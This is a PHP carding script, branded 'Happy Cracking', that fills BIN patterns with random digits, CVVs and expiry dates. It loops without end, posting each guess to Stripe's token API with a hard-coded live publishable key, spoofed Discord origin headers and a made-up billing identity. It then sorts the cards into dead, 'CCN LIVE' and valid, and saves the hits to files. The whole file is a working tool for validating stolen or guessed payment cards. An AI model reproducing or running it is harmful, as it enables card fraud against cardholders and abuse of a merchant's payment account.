<?php
error_reporting(0);

$banner = "\e[36;1m
[•]===============[•]
• 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗫𝘁𝗿𝗮𝗽 ✓
• 𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐕𝐚𝐥𝐢𝐝 𝐂𝐕𝐕 ✓
• 𝗛𝗮𝗽𝗽𝘆 𝗖𝗿𝗮𝗰𝗸𝗶𝗻𝗴 • 「𝙓𝙚𝙧𝙧𝙤𝙭 」x「𝐈𝐧𝐝𝐞𝐱 ↯」
[•]===============[•]
[#] Credit Card Generator [#]";

echo $banner . "\n";
$configFile = 'bin_numbers.txt';

$binNumbers = file($configFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (empty($binNumbers)) {
    echo "Error: No BIN numbers found in the configuration file.\n";
    exit;
}

while (true) {
    foreach ($binNumbers as $bin) {
        $cvv = rand(000, 999);
        $month = rand(1, 12);
        $year = rand(2023, 2030);
        $b = str_split($bin, 1);
        $card = "";

        foreach ($b as $splitCard) {
            $check = ($splitCard === "x") ? rand(0, 9) : $splitCard;
            $card .= $check;
        }

        $splitCard2 = str_split($card, 4);
        $fixCard = implode("+", $splitCard2);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Accept: application/json",
            "Content-Type: application/x-www-form-urlencoded",
            "Origin: https://js.stripe.com",
            "Referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fdiscord.com&stripe_xdm_c=default509095&stripe_xdm_p=1"
        ));
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=1080400&pasted_fields=number%2Czip&guid=NA&muid=f4d48849-7e13-4640-b065-cac94973692874a7ee&sid=249b36de-691b-410e-8458-5cd8bd46901f63a13a&key=pk_live_CUQtlpQUF0vufWpnpUmQvcdi&payment_user_agent=stripe.js%2F7315d41&card[number]=" . $fixCard . "&card[cvc]=" . $cvv . "&card[name]=Michael+S.+Walker&card[address_line1]=1835++College+Avenue&card[address_line2]=&card[address_city]=TULSA&card[address_state]=OK&card[address_zip]=74192&card[address_country]=US&card[exp_month]=" . $month . "&card[exp_year]=" . $year);
        $exe = curl_exec($ch);
        curl_close($ch);

        $response = json_decode($exe);

        if ($response->error != null) {
            echo "\e[31m[X] \e[00m" . $card . "|" . $month . "|" . $year . "|" . $cvv . "\n";
        } elseif (strpos($exe, "incorrect_cvc") !== false) {
            echo "\e[92m[CCN LIVE]\e[00m" . $card . "|" . $month . "|" . $year . "|" . $cvv . "\n";
            $file = fopen("ccnlive.txt", 'a');
            fwrite($file, $card . "|" . $month . "|" . $year . "|" . $cvv . "\n");
            fclose($file);
        } else {
            echo "\e[92m[✓] \e[00m" . $card . "|" . $month . "|" . $year . "|" . $cvv . "\n";
            $file = fopen("489504.txt", 'a');
            fwrite($file, $card . "|" . $month . "|" . $year . "|" . $cvv . "\n");
            fclose($file);
        }
    }
}
